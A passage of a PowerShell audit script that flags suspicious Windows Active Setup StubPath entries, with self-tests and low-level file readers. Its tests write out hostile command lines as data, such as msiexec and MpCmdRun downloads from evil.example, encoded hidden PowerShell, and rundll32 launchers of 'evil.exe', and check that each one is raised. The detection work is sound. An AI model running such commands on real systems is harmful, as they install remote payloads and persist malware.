        @('C:\Program Files\Trail\gone.exe /x', 'names C:\\Program Files\\Trail\\gone\.exe \\x\.exe, whose file could not be read'),
        @('C:\Program Files\Old App\gone.exe a:b.exe', "can also be read as C:\\Program Files\\Old App\\gone\.exe a:b\.exe, which is $notPlain"),
        @(('C:\Program Files\Old App\gone.exe' + (' w' * 30)), 'has more words than this check reads as a path'),
        @('%APPDATA%\Vendor\app.exe /x', "names a program inside each user's own profile"))
    foreach ($h in $hostile) {
        $v = StubCase $h[0]
        $shown = $h[0]; if ($shown.Length -gt 110) { $shown = $shown.Substring(0, 110) + '...' }
        T "hostile: '$shown' is raised" ($v.Sev -eq 'WARNING' -and $v.Line -match "^\[WARNING\] Active Setup 'dz' (StubPath|runs|names) " -and $v.Line -match $h[1]) $v.Line
    }
    $crit = @(
        @('C:\Users\Public\update.exe', "^\[CRITICAL\] Active Setup 'dz' StubPath runs C:\\Users\\Public\\update\.exe from a staging path"),
        @('rundll32.exe C:\Users\Public\x.dll,Run', 'hands a file in a staging path to rundll32\.exe'),
        @('powershell.exe -NoProfile -File C:\Users\Public\x.ps1', 'hands a file in a staging path to powershell\.exe'),
        @('"C:\Windows\System32\rundll32.exe" "C:\Windows\System32\shell32.dll",Control_RunDLL C:\Users\Public\evil.cpl', 'hands a file in a staging path'),
        @('pcalua.exe -a C:/Users/Public/evil.exe', 'staging path'),
        @(('powershell.exe -w hidden -' + 'enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA'), 'attack-shaped command content'),
        @('rundll32.exe url.dll,FileProtocolHandler C:\ProgramData\Acme\evil.exe', 'attack-shaped command content \(fileprotocolhandler\)'),
        @('rundll32.exe shell32.dll,ShellExec_RunDLL C:\ProgramData\Acme\evil.exe', 'attack-shaped command content'),
        @('msiexec.exe /q /i https://evil.example/x.msi', 'attack-shaped command content'),
        @(('"C:\Program Files\Windows Defender\MpCmdRun.exe" -Download' + 'File -url https://evil.example/x -path C:\ProgramData\Acme\dl.exe'), 'attack-shaped command content \(downloadfile\)'),
        @('cmd.exe /D /C start rundll32.exe url.dll,FileProtocolHandler C:\ProgramData\Acme\evil.exe', 'attack-shaped command content'),
        # a staging folder under another spelling (1)
        @('C:\Users\.\Public\tool.exe /s', 'from a staging path'),
        @('C:\Users\\Public\tool.exe /s', 'from a staging path'),
        @('C:\Users\x\..\Public\tool.exe /s', 'from a staging path'),
        @('"C:\Users\.\Public\my tool.exe" /s', 'from a staging path'),
        @('rundll32.exe C:\Users\.\Public\x.dll,Run', 'hands a file in a staging path to rundll32\.exe'),
        @('C:\Users\victim\DOWNLO~1\tool.exe', 'StubPath runs C:\\Users\\victim\\Downloads\\tool\.exe from a staging path'),
        @('regsvr32.exe /s C:\Users\victim\DOWNLO~1\x.dll', 'hands a file in a staging path \(C:\\Users\\victim\\Downloads\\x\.dll\) to regsvr32\.exe'),
        @('"C:\Program Files\Vendor\app.exe" C:\Users\victim\DOWNLO~1\data.bin', 'hands a file in a staging path \(C:\\Users\\victim\\Downloads\\data\.bin\) to app\.exe'),
        @('C:\Program Files\..\Users\.\Public\tool.exe /s', 'StubPath runs C:\\Users\\Public\\tool\.exe from a staging path'),
        @('C:\Program Files\..\Users\.\Public\later.exe /s', 'StubPath runs C:\\Users\\Public\\later\.exe from a staging path .* the file is not there yet'))
    foreach ($h in $crit) {
        $v = StubCase $h[0]
        T "hostile: '$($h[0])' is CRITICAL" ($v.Sev -eq 'CRITICAL' -and $v.Line -match "^\[CRITICAL\] Active Setup 'dz' StubPath " -and $v.Line -match $h[1]) $v.Line
    }
    $v = StubCase 'C:\Users\Public\update.exe' '0'
    T 'an entry switched off (IsInstalled=0) is INFO even when hostile: Windows does not run it' ($v.Sev -eq 'OK' -and $v.Line -match '^\[INFO\] .*IsInstalled=0') $v.Line
    $v = StubCase 'C:\Users\Public\update.exe' 'String:0'
    T 'a non-DWORD IsInstalled of 0 is graded as installed (here CRITICAL), never read as switched off' ($v.Sev -eq 'CRITICAL') $v.Line
    foreach ($k in @('Binary', 'DWord', 'MultiString', 'QWord')) {
        $v = StubCase '' '1' $k
        T "a StubPath stored as $k is a WARNING that it is not text, never INFO (10)" ($v.Sev -eq 'WARNING' -and $v.Line -match "^\[WARNING\] Active Setup 'dz' StubPath is not text: the value is stored as $k") $v.Line
    }
    $before = $script:opened.Count; $beforeAsked = $script:asked.Count
    $v = StubCase (('x ' * 15500) + 'y')
    T 'a 31,000-character StubPath is a WARNING, not parsed: no file is probed and no name looked up' ($v.Sev -eq 'WARNING' -and $v.Line -match 'StubPath is 31001 characters long -- not parsed' -and $script:opened.Count -eq $before -and $script:asked.Count -eq $beforeAsked -and $v.Line.Length -lt 400) $v.Line.Substring(0, [Math]::Min(200, $v.Line.Length))
    $before = $script:opened.Count
    $v = StubCase ('C:\ProgramData\gone' + (' w' * 400))
    T 'a line of 400 words is probed at most as often as CreateProcess tries are read (24)' (($script:opened.Count - $before) -le 24 -and $v.Sev -eq 'WARNING') ("probes: " + ($script:opened.Count - $before))

    # ---- the malign twins of the two argument-only Windows entries ----
    $script:onPath['u.exe'] = 'C:\Users\me\AppData\Local\Programs\Tool\U.exe'
    Add-File 'C:\Users\me\AppData\Local\Programs\Tool\U.exe' 'vendor'
    $v = StubCase 'U'
    T "a U.exe on the search path shadows the 'U' StubPath -- a WARNING naming it, even validly signed" ($v.Sev -eq 'WARNING' -and $v.Line -match 'would find C:\\Users\\me\\AppData\\Local\\Programs\\Tool\\U\.exe') $v.Line
    $script:onPath.Remove('u.exe')
    Add-File 'C:\UserInstall.exe' 'vendor'
    $v = StubCase '/UserInstall'
    T "a C:\UserInstall.exe shadows the '/UserInstall' StubPath -- a WARNING naming it" ($v.Sev -eq 'WARNING' -and $v.Line -match 'would find C:\\UserInstall\.exe') $v.Line
    $script:disk.Remove('c:\userinstall.exe')
    $v = StubCase '/userinstall'
    T "only the EXACT text is Windows' own: '/userinstall' is judged like any line (here stale: C:\userinstall.exe is absent and only an administrator can put it there)" ($v.Sev -eq 'OK' -and $v.Line -match '^\[INFO\] .*names C:\\userinstall\.exe, which is not on disk -- a stale entry') $v.Line
    Add-File 'C:\Program.exe' 'unsigned'
    $v = StubCase 'C:\Program Files\Vendor\app.exe /x'
    T 'an unquoted path is run by its FIRST reading that exists: a planted C:\Program.exe is the program, and is raised' ($v.Sev -eq 'WARNING' -and $v.Line -match 'runs C:\\Program\.exe .* not validly signed') $v.Line
    $script:disk.Remove('c:\program.exe')

    # ---- nothing that is not a plain local file was ever opened or looked up ----
    $bad = @($script:opened | Where-Object {
        $_ -notmatch '^[CD]:\\' -or $_.Length -gt 259 -or $_.IndexOf(':', 2) -ge 0 -or $_ -match '["<>|*?]' -or
        @(($_.Substring(3) -split '\\') | Where-Object { $_ -match $script:DeviceNameRx }).Count -gt 0 })
    T 'no network, mapped, removable, device, stream or over-long path reached the file probe' ($bad.Count -eq 0 -and $script:opened.Count -gt 150) (($bad | Select-Object -First 3) -join ' | ')
    $badAsk = @($script:asked | Where-Object { $_ -match '[\\/:*?"<>|]' -or $_ -match $script:DeviceNameRx })
    T 'no name with a drive, a separator, a stream or a device name reached the search-path lookup' ($badAsk.Count -eq 0 -and $script:asked.Count -gt 20) (($badAsk | Select-Object -First 3) -join ' | ')
    $beforeAsked = $script:asked.Count
    $got = @('Z:evil.exe', 'CON', 'NUL.txt', 'sub\tool.exe', 'x.txt:s', '..\x.exe', 'a/b.exe', 'what?.exe') | ForEach-Object { Find-OnSearchPath $_ $which }
    T 'the search-path lookup itself refuses a name that is not a plain file name, whoever calls it' ((@($got | Where-Object { $_ }).Count -eq 0) -and $script:asked.Count -eq $beforeAsked) ("asked: " + ($script:asked.Count - $beforeAsked))
    $dkAll = { 'Fixed' }
    foreach ($np in @('C:\Windows\System32\CON', 'C:\Windows\System32\NUL.txt', 'C:\Windows\System32\NUL ', 'C:\Windows\System32\CON .txt', ('C:\x\COM' + [char]0xB9), 'C:\x\LPT1.log', 'C:\x\CONIN$', 'C:\x\CLOCK$', 'C:\x\aux\y.exe',
                      'C:\x\a.txt:s', 'C:evil.exe', 'C:\a*b', 'C:\a?b', 'C:\a|b', '\\h\s\x', '\\?\C:\x', 'x.exe', ('C:\' + ('a' * 260)))) {
        T "not a path this audit may open: '$(Get-CleanText $np)'" (-not (Test-OpenablePath $np $dkAll)) ''
    }
    T 'a plain file path on a fixed drive may be opened; the same on a network or missing drive may not' ((Test-OpenablePath 'C:\Program Files\Vendor\app.exe' $dk) -and (Test-OpenablePath 'C:\x\console.exe' $dk) -and (Test-OpenablePath 'C:\x\com10.exe' $dk) -and -not (Test-OpenablePath 'Z:\Vendor\app.exe' $dk) -and -not (Test-OpenablePath 'Q:\Vendor\app.exe' $dk)) ''

    # ---- the door, proved from this file's own syntax tree ----
    # Reading is not a proof that nothing else touches a file. Every command
    # and .NET type that can must sit inside one of the functions named here.
    $src = $null; $perr = $null; $tk = $null
    $ast = [System.Management.Automation.Language.Parser]::ParseFile($PSCommandPath, [ref]$tk, [ref]$perr)
    $fsCmd = @('Get-Item', 'Get-ChildItem', 'Test-Path', 'Get-AuthenticodeSignature', 'Get-Content', 'Get-Command', 'Resolve-Path', 'Get-FileHash', 'Get-ItemProperty',
               'Get-ItemPropertyValue', 'Set-Content', 'Add-Content', 'Out-File', 'New-Item', 'Remove-Item', 'Copy-Item', 'Move-Item', 'Start-Process', 'Invoke-Item',
               'Import-Module', 'Get-Acl', 'Select-String', 'Invoke-Expression', 'Invoke-WebRequest', 'Invoke-RestMethod', 'New-Object', 'Add-Type')
    $fsType = '^(System\.)?(IO\.(File|Directory|FileInfo|DirectoryInfo|DriveInfo|FileStream|StreamReader|Path)|Diagnostics\.(FileVersionInfo|Process)|Net\.\w+)$|^DozeSec\.|^Microsoft\.Win32\.Registry'
    $door = @('Read-ImageFacts', 'Get-LongPath', 'Get-ReparseTag', 'Test-AbsentForSure', 'Get-WhenLine', 'Get-RegKeyLastWrite', 'Read-RegValueState', 'Read-ActiveSetupRoot', 'Write-Marker', 'Get-DriveKind')
    function OwnerOf { param($Node)
        $p = $Node.Parent
        while ($null -ne $p) { if ($p -is [System.Management.Automation.Language.FunctionDefinitionAst]) { return $p.Name }; $p = $p.Parent }
        return '(top level)'
    }
    $viol = New-Object System.Collections.Generic.List[string]
    $nDoor = 0
    foreach ($c in $ast.FindAll({ param($n) $n -is [System.Management.Automation.Language.CommandAst] }, $true)) {
        $name = $c.GetCommandName()
        if ($name -and $fsCmd -contains $name) {
            $o = OwnerOf $c
            # New-Object of a list or a string builder is not a file.
            if ($name -eq 'New-Object' -and $c.Extent.Text -match 'System\.Collections\.|System\.Text\.StringBuilder') { continue }
            if ($door -contains $o) { $nDoor++ } else { $viol.Add("$name in $o (line $($c.Extent.StartLineNumber))") }
        }
    }
    foreach ($e in $ast.FindAll({ param($n) $n -is [System.Management.Automation.Language.TypeExpressionAst] }, $true)) {
        if ($e.TypeName.FullName -match $fsType) {
            $o = OwnerOf $e
            if ($door -contains $o) { $nDoor++ } else { $viol.Add("[$($e.TypeName.FullName)] in $o (line $($e.Extent.StartLineNumber))") }
        }
    }
    T 'every command and type that can touch a file, the registry or the network sits inside a door function (read from this file''s own syntax tree)' ($viol.Count -eq 0 -and $nDoor -ge 15 -and @($perr).Count -eq 0) (($viol | Select-Object -First 6) -join ' | ')
    $calls = @($ast.FindAll({ param($n) $n -is [System.Management.Automation.Language.CommandAst] -and $n.InvocationOperator -eq 'Ampersand' -and
                              $n.CommandElements[0] -is [System.Management.Automation.Language.VariableExpressionAst] }, $true))
    $probeCalls = @($calls | Where-Object { $_.CommandElements[0].VariablePath.UserPath -ieq 'Probe' } | ForEach-Object { OwnerOf $_ })
    $whichCalls = @($calls | Where-Object { $_.CommandElements[0].VariablePath.UserPath -ieq 'Which' } | ForEach-Object { OwnerOf $_ })
    T 'the file probe is called from Get-FileFacts and nowhere else; the search-path lookup from Find-OnSearchPath and nowhere else' ($probeCalls.Count -eq 1 -and $probeCalls[0] -eq 'Get-FileFacts' -and $whichCalls.Count -eq 1 -and $whichCalls[0] -eq 'Find-OnSearchPath') (("probe: " + ($probeCalls -join ',')) + ' which: ' + ($whichCalls -join ','))

    # ---- pieces ----
    $np = @(
        @('C:\Users\.\Public\x.exe', 'C:\Users\Public\x.exe'), @('C:\Users\\Public\x.exe', 'C:\Users\Public\x.exe'), @('C:/Users/Public/x.exe', 'C:\Users\Public\x.exe'),
        @('C:\Users\x\..\Public\x.exe', 'C:\Users\Public\x.exe'), @('C:\..\..\x.exe', 'C:\x.exe'), @('C:\Windows\Tasks.\x.exe', 'C:\Windows\Tasks\x.exe'),
        @('C:\a\x.exe. .', 'C:\a\x.exe'), @('C:\a \x.exe', 'C:\a \x.exe'), @('C:\a\...\x.exe', 'C:\a\...\x.exe'), @('\\h\s\x', '\\h\s\x'))
    foreach ($q in $np) { T "Windows reads '$($q[0])' as '$($q[1])'" ((Get-NormalWinPath $q[0]) -ceq $q[1]) (Get-NormalWinPath $q[0]) }
    T 'a staging folder is found under another spelling, and a folder that only begins like one is not one' ((Test-StagingText 'C:\Users\.\Public\x.exe /s') -and (Test-StagingText 'xcopy C:\src C:\Users\Public') -and (Test-StagingText '"C:\Users\Public"') -and
        -not (Test-StagingText 'C:\Users\Public Documents\x.exe') -and -not (Test-StagingText 'C:\Temp Files\x.exe /s') -and -not (Test-StagingText '"C:\Program Files\Vendor\Downloads Manager\dm.exe" /s')) ''
    T 'a forward slash is a separator in a CreateProcess try, and .exe is added only when the last name has no extension' ((Get-TryPath 'C:/Program Files/Acme.v2/evil') -eq 'C:\Program Files\Acme.v2\evil.exe' -and (Get-TryPath 'C:\a\gone.exe /s') -eq 'C:\a\gone.exe \s.exe' -and (Get-TryPath 'C:\a\tool.') -eq 'C:\a\tool.' -and (Get-TryPath 'C:\a\x.dat') -eq 'C:\a\x.dat') (Get-TryPath 'C:\a\gone.exe /s')
    T 'a name no file can have is told from one that may exist but may not be opened' ((Test-ImpossibleName 'C:\a\gone.exe C:\b\c.xml') -and (Test-ImpossibleName 'C:\a\gone.exe "x') -and (Test-ImpossibleName ('C:\' + ('a' * 260))) -and -not (Test-ImpossibleName 'C:\a\gone.exe a:b.exe') -and -not (Test-ImpossibleName 'C:\a\NUL.exe')) ''
    $d = Get-DllSpec '"C:\Program Files\Vendor\x y.dll",Entry'
    T 'a quoted DLL path with spaces is read whole' ($d.Ok -and $d.Dll -eq 'C:\Program Files\Vendor\x y.dll' -and $d.Export -eq 'Entry' -and -not $d.Tail) ($d.Dll + ' | ' + $d.Export)
    $d = Get-DllSpec 'shell32.dll,Control_RunDLL desk.cpl,,2'
    T 'what follows the entry point is kept apart as the text handed to it' ($d.Ok -and $d.Dll -eq 'shell32.dll' -and $d.Export -eq 'Control_RunDLL' -and $d.Tail -eq 'desk.cpl,,2') ($d.Dll + ' | ' + $d.Export + ' | ' + $d.Tail)
    T 'an unquoted DLL name ends at the first space, as rundll32 reads it: one with a space in it is not accounted for' (-not (Get-DllSpec 'C:\Program Files\Vendor\x.dll,Entry').Ok -and -not (Get-DllSpec 'shell32.dll Control_RunDLL').Ok -and -not (Get-DllSpec 'shell32.dll,#61').Ok -and -not (Get-DllSpec '').Ok) ''
    $a = Get-StockArgAccount -Kind 'stock-inert' -Rest ' /s /n /i:/UserInstall --channel=stable OCInstallUserConfigOE -UserConfig /FirstLogon'
    T 'plain switches and plain words are accounted for; nothing is left to verify' ($a.Ok -and @($a.Files).Count -eq 0) $a.Why
    T 'the Windows folder is admin-only by name, its user-writable folders are not, and neither is ProgramData or another drive' ((Test-AdminOnlyPath 'C:\Windows\System32\x.dll' $SR) -and (Test-AdminOnlyPath 'C:\Program Files (x86)\V\x.exe' $SR) -and (Test-AdminOnlyPath 'C:\Program.exe' $SR) -and -not (Test-AdminOnlyPath 'C:\Windows\Tasks\x.exe' $SR) -and -not (Test-AdminOnlyPath 'C:\Windows\Tasks.\x.exe' $SR) -and -not (Test-AdminOnlyPath 'C:\ProgramData\x.exe' $SR) -and -not (Test-AdminOnlyPath 'D:\Program Files\V\x.exe' $SR) -and -not (Test-AdminOnlyPath 'C:\NewFolder\x.exe' $SR)) ''
    T 'text from the registry is printed on one line, without control or text-direction characters' ((Get-CleanText ("a`r`nb" + [char]0x202E + "c`td" + [char]0x2028 + 'e')) -eq 'a b c d e') (Get-CleanText ("a`r`nb" + [char]0x202E + 'c'))

    # ---- the report: gaps, and a planted entry beside a benign one ----
    function ReportCase { param([object[]]$Roots)
        return (Get-ActiveSetupReport -Roots $Roots -Probe $probe -DriveKind $dk -Which $which -SystemRoot $SR -SystemDrive 'C:')
    }
    $mail = @{ Key = '{A}'; Name = 'Windows Mail'; Stub = '"C:\Program Files\Windows Mail\WinMail.exe" OCInstallUserConfigOE'; StubKind = 'String'; IsInstalled = '1' }
    $a = ReportCase @(
        @{ Root = 'R1'; Required = $true; State = 'ok'; Unread = @('{BAD}'); Entries = @($mail, @{ Key = '{B}'; Name = ''; Stub = ''; StubKind = 'String'; IsInstalled = '1' }) },
        @{ Root = 'R2'; Required = $false; State = 'nokey' }); $t = $a.Lines -join "`n"
    T 'an unreadable component is a raised gap naming it; an optional root that is absent is not' ($a.Gap -eq 'WARNING' -and $a.Sev -eq 'OK' -and $t -match '1 component\(s\) under R1 that could not be read: \{BAD\}' -and $t -notmatch 'R2' -and $t -notmatch 'none suspicious') $t
    $a = ReportCase @(@{ Root = 'R1'; Required = $true; State = 'nokey' })
    T 'a missing native Installed Components key is a gap' ($a.Gap -eq 'WARNING' -and ($a.Lines -join ' ') -match 'NOT performed') ($a.Lines -join ' | ')
    $a = ReportCase @(@{ Root = 'R1'; Required = $true; State = 'unreadable'; Error = 'denied' })
    T 'an unreadable Installed Components key is a gap, never the all-clear' ($a.Gap -eq 'WARNING' -and ($a.Lines -join ' ') -notmatch '\[OK\]') ($a.Lines -join ' | ')
    $a = ReportCase @(@{ Root = 'R1'; Required = $true; State = 'ok'; Unread = @(); Entries = @($mail, @{ Key = '{E}'; Name = "it's"; Stub = 'C:\Users\Public\update.exe'; StubKind = 'String'; IsInstalled = '1' }) })
    T 'a planted entry beside a benign one: CRITICAL, one hit, no all-clear, and an apostrophe in its name cannot end the label' ($a.Sev -eq 'CRITICAL' -and @($a.Hits).Count -eq 1 -and ($a.Lines -join ' ') -notmatch 'none suspicious' -and ($a.Lines -join "`n") -match "(?m)^\[CRITICAL\] Active Setup '\{E\} \(its\)' ") ($a.Lines -join ' | ')
    $a = ReportCase @(@{ Root = 'R1'; Required = $true; State = 'ok'; Unread = @(); Entries = @($mail) })
    T 'only benign entries: the all-clear with the count' ($a.Sev -eq 'OK' -and $a.Gap -eq 'OK' -and ($a.Lines -join "`n") -match '(?m)^\[OK\] Active Setup: 1 StubPath command\(s\) graded, none suspicious\.$') ($a.Lines -join ' | ')
    $forged = "{F}`r`n[OK] Active Setup: 9 StubPath command(s) graded, none suspicious."
    $a = ReportCase @(@{ Root = 'R1'; Required = $true; State = 'ok'; Unread = @(); Entries = @(@{ Key = $forged; Name = "n`nm"; Stub = "C:\ProgramData\Acme\evil.exe`n[OK] x"; StubKind = 'String'; IsInstalled = '1' }) })
    T 'a component key, name or StubPath holding a line break cannot write a report line of its own' (@($a.Lines | Where-Object { $_ -match "[`r`n]" }).Count -eq 0 -and @($a.Lines | Where-Object { $_ -match '^\[OK\]' }).Count -eq 0 -and $a.Sev -eq 'WARNING') ($a.Lines -join ' | ')
    $a = ReportCase @(@{ Root = 'R1'; Required = $true; State = 'ok'; Unread = @(); Entries = @(@{ Key = '{K}'; Name = ''; Stub = ''; StubKind = 'Binary'; IsInstalled = '1' }) })
    T 'a StubPath that is not text is graded (a WARNING), never skipped as empty' ($a.Sev -eq 'WARNING' -and ($a.Lines -join ' ') -match 'StubPath is not text') ($a.Lines -join ' | ')
    $lots = @(); foreach ($i in 1..520) { $lots += @{ Key = "{N$i}"; Name = ''; Stub = 'C:\Windows\System32\ie4uinit.exe -UserConfig'; StubKind = 'String'; IsInstalled = '1' } }
    $a = ReportCase @(@{ Root = 'R1'; Required = $true; State = 'ok'; Unread = @(); Entries = $lots })
    $gradedLines = @($a.Lines | Where-Object { $_ -match "^\[OK\] Active Setup '\{N\d+\}'" }).Count
    T 'more components than any Windows holds: exactly 512 are graded and the rest is a raised gap, never an all-clear' ($gradedLines -eq 512 -and $a.Gap -eq 'WARNING' -and ($a.Lines -join ' ') -match 'NOT performed for 8 StubPath command\(s\) under R1: only the first 512 were graded' -and ($a.Lines -join ' ') -notmatch 'none suspicious') ("graded lines: $gradedLines | " + (($a.Lines | Select-Object -Last 1) -join ' | '))

    $env:SystemRoot = $savedSR; $env:APPDATA = $savedAD
    if ($fails) { Write-Output "[FAIL] $fails boot_activesetup_check self-test expectation(s) unmet"; exit 1 }
    Write-Output "[OK] boot_activesetup_check self-test: Windows' own entries read clean on a pretend disk that says 'absent' by default, every hostile line is raised, and no path that is not a plain local file was opened."
    exit 0
}

# ---- live readers --------------------------------------------------------
# Everything below that touches a file is reached only through Get-FileFacts
# (so only for a plain path on a local fixed drive) or is handed a path that
# has already been through it. -SelfTest proves the first half from this
# file's syntax tree.

# A 32-bit PowerShell on a 64-bit Windows is shown SysWOW64 under the name
# System32; Sysnative is the real one. Strings only.
$script:wow64 = ([Environment]::Is64BitOperatingSystem -and -not [Environment]::Is64BitProcess)
$script:sys32Dir = Join-WinPath $env:SystemRoot 'System32'
$script:sysNative = Join-WinPath $env:SystemRoot 'Sysnative'
function Get-OpenPath {
    param([string]$Path)
    if ($script:wow64 -and $Path.StartsWith($script:sys32Dir + '\', [StringComparison]::OrdinalIgnoreCase)) { return ($script:sysNative + $Path.Substring($script:sys32Dir.Length)) }
    return $Path
}
function Get-LogicalPath {
    param([string]$Path)
    if ($script:wow64 -and $Path.StartsWith($script:sysNative + '\', [StringComparison]::OrdinalIgnoreCase)) { return ($script:sys32Dir + $Path.Substring($script:sysNative.Length)) }
    return $Path
}

# A short (8.3) path names the same file as its long form; the folder tests
# are by name, so they need the long one. Any failure keeps the path as
# given, which only makes the verdict more cautious.
function Get-LongPath {
    param([string]$Path)
    if ($Path -notmatch '~') { return $Path }
    try {
        if (-not ([System.Management.Automation.PSTypeName]'DozeSec.LongPath').Type) {
            Add-Type -ErrorAction Stop -Namespace DozeSec -Name LongPath -MemberDefinition @'
[DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
public static extern uint GetLongPathName(string lpszShortPath, System.Text.StringBuilder lpszLongPath, uint cchBuffer);
'@
        }
        $sb = New-Object System.Text.StringBuilder 1024
        $n = [DozeSec.LongPath]::GetLongPathName($Path, $sb, 1024)
        if ($n -gt 0 -and $n -lt 1024) { return $sb.ToString() }
    } catch {}
    return $Path
}

# Pinned shared copy (tools/lint_shared_copies.ps1): file_walk_check's.
function Get-ReparseTag {
    param([string]$Path)
    try {
        if (-not ('DozeSec.ReparseTag' -as [type])) {
            Add-Type -ErrorAction Stop -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
namespace DozeSec {
    public static class ReparseTag {
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct WIN32_FIND_DATAW {
            public uint dwFileAttributes;
            public System.Runtime.InteropServices.ComTypes.FILETIME c, a, w;
            public uint nFileSizeHigh, nFileSizeLow, dwReserved0, dwReserved1;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)] public string cFileName;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 14)] public string cAlternateFileName;
        }
        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        static extern IntPtr FindFirstFileW(string name, out WIN32_FIND_DATAW data);
        [DllImport("kernel32.dll")]
        static extern bool FindClose(IntPtr h);
        public static long Get(string path) {
            WIN32_FIND_DATAW d;
            IntPtr h = FindFirstFileW(path, out d);
            if (h == new IntPtr(-1)) { return -1; }
            FindClose(h);
            if ((d.dwFileAttributes & 0x400) == 0) { return 0; }
            return (long)d.dwReserved0;
        }
    }
}
'@
        }
        $p = $Path
        if ($p.Length -ge 248 -and -not $p.StartsWith('\\')) { $p = '\\?\' + $p }
        $r = [DozeSec.ReparseTag]::Get($p)
        if ($r -lt 0) { return $null }
        return [uint32]$r
    } catch { return $null }
}

function Get-DriveKind {
    param([string]$Letter)
    try { return [string](New-Object System.IO.DriveInfo ($Letter + ':\')).DriveType } catch { return '' }
}

# Facts about one file: signed|unsigned|unverified|absent|unread|dir|reparse.
# Called only through Get-FileFacts, so only for a normalised plain path on a
# local fixed drive.
function Read-ImageFacts {
    param([string]$Path)
    $segs = @($Path.Substring(3) -split '\\')
    # 1. A folder name that ends in a space or a period. A path only gets one
    #    by reading "<name> /switch" as a folder. Windows keeps a folder
    #    name's trailing space (Microsoft, "File path formats on Windows
    #    systems") while .NET may trim it and open another path, so the
    #    folder that would hold it is asked for its own list of names and
    #    nothing below is opened.
    $acc = $Path.Substring(0, 2)
    for ($i = 0; $i -lt $segs.Count - 1; $i++) {
        $seg = [string]$segs[$i]
        if ($seg.EndsWith(' ') -or $seg.EndsWith('.')) {
            $names = $null
            try { $names = @([IO.Directory]::GetFileSystemEntries((Get-OpenPath ($acc + '\')))) }
            catch [System.IO.DirectoryNotFoundException] { return @{ State = 'absent' } }
            catch { return @{ State = 'unread'; Why = (Get-OneLine $_.Exception.Message) } }
            foreach ($n in $names) {
                $leaf = ([string]$n).Substring(([string]$n).LastIndexOf('\') + 1)
                if ($seg.EndsWith('.')) { if ($leaf.StartsWith($seg.TrimEnd('.'), [StringComparison]::OrdinalIgnoreCase)) { return @{ State = 'unread'; Why = 'it lies under a folder whose name ends in periods, which Windows and this audit may read differently' } } }
                elseif ([string]::Equals($leaf, $seg, [StringComparison]::OrdinalIgnoreCase)) { return @{ State = 'unread'; Why = 'it lies under a folder whose name ends in a space, which this audit does not open' } }
            }
            return @{ State = 'absent' }
        }
        $acc = $acc + '\' + $seg
    }
    # 2. Links. Every folder on the way and the file itself, top down, never
    #    followed: a link on this drive can lead to a network path. The tag is
    #    read from the parent's listing. Only the tag of a file Windows itself
    #    keeps compressed (WOF, 0x80000017) is not a link or a placeholder.
    $acc = $Path.Substring(0, 2)
    for ($i = 0; $i -lt $segs.Count; $i++) {
        $acc = $acc + '\' + [string]$segs[$i]
        $attr = $null
        try { $attr = [int][IO.File]::GetAttributes((Get-OpenPath $acc)) } catch { break }
        if (($attr -band 0x400) -ne 0) {
            $tag = Get-ReparseTag (Get-OpenPath $acc)
            if ($null -eq $tag -or [uint32]$tag -ne [uint32]2147483671) { return @{ State = 'reparse'; Link = $acc } }
        }
        if ($i -lt $segs.Count - 1 -and ($attr -band 0x10) -eq 0) { break }
    }
    # 3. Is it there? Absent only when the parent answers without it.
    $open = Get-OpenPath $Path
    $it = $null
    try { $it = Get-Item -LiteralPath $open -Force -ErrorAction Stop }
    catch {
        $why = Get-OneLine $_.Exception.Message
        if (Test-AbsentForSure $open) { return @{ State = 'absent' } }
        return @{ State = 'unread'; Why = $why }
    }
    if ($it.PSIsContainer) { return @{ State = 'dir' } }
    # 4. What it is. A program file begins "MZ" whatever its name; a file
    #    whose first bytes could not be read is treated as one.
    $real = Get-LogicalPath (Get-LongPath $open)
    $pe = $true
    $fs = $null
    try {
        $fs = [IO.File]::Open($open, [IO.FileMode]::Open, [IO.FileAccess]::Read, ([IO.FileShare]::ReadWrite -bor [IO.FileShare]::Delete))
        $b1 = $fs.ReadByte(); $b2 = $fs.ReadByte()
        $pe = ($b1 -eq 0x4D -and $b2 -eq 0x5A)
    } catch { $pe = $true } finally { if ($fs) { $fs.Dispose() } }
    $sig = $null
    try { $sig = Get-AuthenticodeSignature -LiteralPath $open -ErrorAction Stop }
    catch { return @{ State = 'unverified'; Why = (Get-OneLine $_.Exception.Message); RealPath = $real; Pe = $pe } }
    if ($null -eq $sig) { return @{ State = 'unverified'; Why = 'no signature answer'; RealPath = $real; Pe = $pe } }
    if ($sig.Status -ne 'Valid' -or -not $sig.SignerCertificate) { return @{ State = 'unsigned'; Status = [string]$sig.Status; RealPath = $real; Pe = $pe } }
    $subj = [string]$sig.SignerCertificate.Subject
    $cn = $subj
    if ($subj -match '(?:^|,\s*)CN=(.+?)(?:,\s*[A-Za-z]+=|$)') { $cn = $Matches[1].Trim().Trim('"') }
    $ms = ($cn -match '^Microsoft\b')
    # The name Microsoft built the file under, from its version resource.
    $orig = ''
    if ($ms) { try { $orig = [string][System.Diagnostics.FileVersionInfo]::GetVersionInfo($open).OriginalFilename } catch { $orig = '' } }
    return @{ State = 'signed'; CN = (Get-CleanText $cn); Microsoft = $ms; RealPath = $real; OriginalName = $orig; Pe = $pe }
}

$script:factCache = @{}
function Get-ImageFacts {
    param([string]$Path)
    $key = $Path.ToLowerInvariant()
    if (-not $script:factCache.ContainsKey($key)) { $script:factCache[$key] = Read-ImageFacts $Path }
    return $script:factCache[$key]
}

# One Installed Components root, through .NET so a component name is never a
# wildcard and one restricted component does not lose the rest. The StubPath
# is read as stored, with its kind: only text is a command.
function Read-ActiveSetupRoot {
    param([string]$Root, [bool]$Required)
    $out = @{ Root = $Root; Required = $Required; State = 'ok'; Error = ''; Unread = @(); Entries = @() }
    $k = $null
    if ($Root -match '^(?i)HKLM:\\(.+)$') {
        # Through the 64-bit view on a 64-bit Windows: a 32-bit PowerShell
        # would otherwise be redirected to WOW6432Node and read that twice,
        # never the native key, and still print the all-clear.
        $rel = $Matches[1]
        $view = if ([Environment]::Is64BitOperatingSystem) { [Microsoft.Win32.RegistryView]::Registry64 } else { [Microsoft.Win32.RegistryView]::Default }
        try {
